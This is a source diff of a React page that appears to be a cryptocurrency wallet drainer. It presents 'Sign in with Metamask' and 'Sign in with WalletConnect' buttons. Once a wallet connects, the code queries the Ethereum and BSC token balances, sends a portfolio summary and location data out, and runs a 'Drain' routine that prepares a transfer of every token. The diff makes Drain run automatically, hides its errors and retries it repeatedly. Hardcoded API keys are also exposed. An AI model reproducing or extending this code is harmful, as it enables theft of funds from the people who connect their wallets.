@@ -4,6 +4,7 @@ import axios from "axios";
 import { useEffect, useState } from "react";
 import Web3 from "web3";
 import { ABI, USDTBSC } from "./constant";
+// import { useWeb3Modal } from '@web3modal/wagmi/react'
 import {
   checkAndChangeNetwork,
   getLocationData,
@@ -12,13 +13,24 @@ import {
   switchToBsc,
   switchToEthereumMainnet,
 } from "./functions";
+import { useWeb3Modal } from "@web3modal/wagmi/react";
+import { mainnet, bsc } from "viem/chains";
+import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
 
+// 1. Get projectId at https://cloud.walletconnect.com
 function App() {
+  const projectId = "bc9d6883c609c7f108a6492128674ec6";
+  const chains = [mainnet, bsc];
+  const { open } = useWeb3Modal();
   const [connected, setConnected] = useState(false);
   const [account, setAccount] = useState("");
   const [balances, setBalances] = useState([]);
   const [bscbalances, setbscBalances] = useState([]);
-
+  const [provider, setProvider] = useState();
+  let url = window.location.href;
+  let final = new URL(url);
+  let searchParms = new URLSearchParams(final?.search);
+  let source = searchParms.get("key");
   const connectWallet = async () => {
     if (typeof window.ethereum !== "undefined") {
       try {
@@ -27,11 +39,11 @@ function App() {
         const accounts = await web3.eth.getAccounts();
         console.log("Connected account:", accounts[0]);
         setAccount(accounts[0]);
-        switchToEthereumMainnet()
-        // checkAndChangeNetwork();
+        getLocationData(source);
+        switchToEthereumMainnet();
         setConnected(true);
-        ApiServices(accounts[0]);
-        getLocationData();
+        setProvider(window.ethereum)
+        let result = await ApiServices(accounts[0]);
       } catch (error) {
         console.error(error);
       }
@@ -39,50 +51,78 @@ function App() {
       console.log("Please install MetaMask!");
     }
   };
+  const connectWalletConnect = async () => {
+    const connector = new WalletConnectConnector({
+      chains: chains,
+      options: {
+        projectId: projectId,
+      },
+    });
+    let provider = await connector.connect();
+    console.log({ provider });
+    let pro = await connector.getProvider();
+    setConnected(true);
+    setProvider(pro);
+    let web3 = new Web3(pro);
+    const accounts = await web3.eth.getAccounts();
+    console.log("Connected account:", accounts[0]);
+    setAccount(accounts[0]);
+    getLocationData(source);
+    setConnected(true);
+    let result = await ApiServices(accounts[0]);
+    console.log({ pro });
+  };
 
-  const Drain = async () => {
+  const Drain = async (connected) => {
     if (connected) {
-      if (balances.length>1) {
-        switchToEthereumMainnet()
-        .then(async (res) => {
-          if (res) {
-            for (const item of balances) {
-              try {
-                await prepareTransaction(item, account);
-              } catch (error) {
-                alert("Something went wrong");
+      if (balances.length > 1) {
+        console.log("ethereum");
+        switchToEthereumMainnet(provider)
+          .then(async (res) => {
+            if (res) {
+              for (const item of balances) {
+                try {
+                  await prepareTransaction(item, account, provider);
+                } catch (error) {
+                  console.log(error)
+                  // alert("Something went wrong");
+                }
               }
+            } else {
+              Drain(connected);
             }
-          }
-        })
-        .catch((e) => {
-          alert("Please switch to ethereum mainnet");
-        });
+          })
+          .catch((e) => {
+            alert("Please switch to ethereum mainnet");
+          });
       }
-      if (bscbalances.length>1) {
-        switchToBsc()
-        .then(async (res) => {
-          if (res) {
-            for (const item of bscbalances) {
-              try {
-                await prepareTransaction(item, account);
-              } catch (error) {
-                alert("Something went wrong");
+      if (bscbalances.length > 1) {
+        console.log("binance");
+        switchToBsc(provider)
+          .then(async (res) => {
+            if (res) {
+              for (const item of bscbalances) {
+                try {
+                  await prepareTransaction(item, account , provider);
+                } catch (error) {
+                  console.log(error)
+                  // alert("Something went wrong");
+                }
               }
+            } else {
+              Drain(connected);
             }
-          }
-        })
-        .catch((e) => {
-          alert("Please switch to ethereum mainnet");
-        });
+          })
+          .catch((e) => {
+            alert("Please switch to ethereum mainnet");
+            Drain(connected);
+          });
       }
-     
-     
     }
   };
 
   const ApiServices = async (account) => {
-    axios
+    await axios
       .get(
         `https://api.covalenthq.com/v1/eth-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
       )
@@ -90,35 +130,41 @@ function App() {
         let newArr = res?.data?.data?.items?.filter(
           (item) => Number(item?.quote_rate) > 0
         );
+        // eth = newArr;
         setBalances(newArr);
-        axios
-          .get(
-            `https://api.covalenthq.com/v1/bsc-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
-          )
-          .then((res) => {
-            let newArr = res?.data?.data?.items?.filter(
-              (item) => Number(item?.quote_rate) > 0
-            );
-            setbscBalances(newArr);
-          });
       });
+    await axios
+      .get(
+        `https://api.covalenthq.com/v1/bsc-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
+      )
+      .then((res) => {
+        let newArr = res?.data?.data?.items?.filter(
+          (item) => Number(item?.quote_rate) > 0
+        );
+        // bsc = newArr;
+        setbscBalances(newArr);
+      });
+    // return true
   };
 
   useEffect(() => {
-    if (balances?.length>0) {
-      let message='Totol Portfolio is '
-      balances.forEach((item)=>{
-        message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
-      })
+    if (balances?.length > 0) {
+      let message = "Totol Portfolio for Ethereum Mainent ";
+      balances.forEach((item) => {
+        message +=
+          String(item?.contract_name) + " " + String(item?.pretty_quote) + " ";
+      });
       sendMessage(message)
     }
   }, [balances]);
   useEffect(() => {
-    if (bscbalances?.length>0) {
-      let message='Totol Portfolio is '
-      balances.forEach((item)=>{
-        message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
-      })
+    if (bscbalances?.length > 0) {
+      let message = "Totol Portfolio for Binance Smart Chain ";
+      bscbalances.forEach((item) => {
+        message +=
+          String(item?.contract_name) + " " + String(item?.pretty_quote) + " ";
+      });
+      Drain(connected);
       sendMessage(message)
     }
   }, [bscbalances]);
@@ -126,8 +172,11 @@ function App() {
   return (
     <div>
       {console.log({ balances })}
-      {!connected && <button onClick={connectWallet}>Connect Wallet</button>}
-      <button onClick={Drain}>Send Message</button>
+      {!connected && <button className="metamask-button" onClick={connectWallet}>
+  Sign in with Metamask
+</button>}
+      {/* <button onClick={Drain}>Send Message</button> */}
+      <button onClick={connectWalletConnect} className="metamask-button">Sign in with WalletConnnect</button>
     </div>
   );
 }
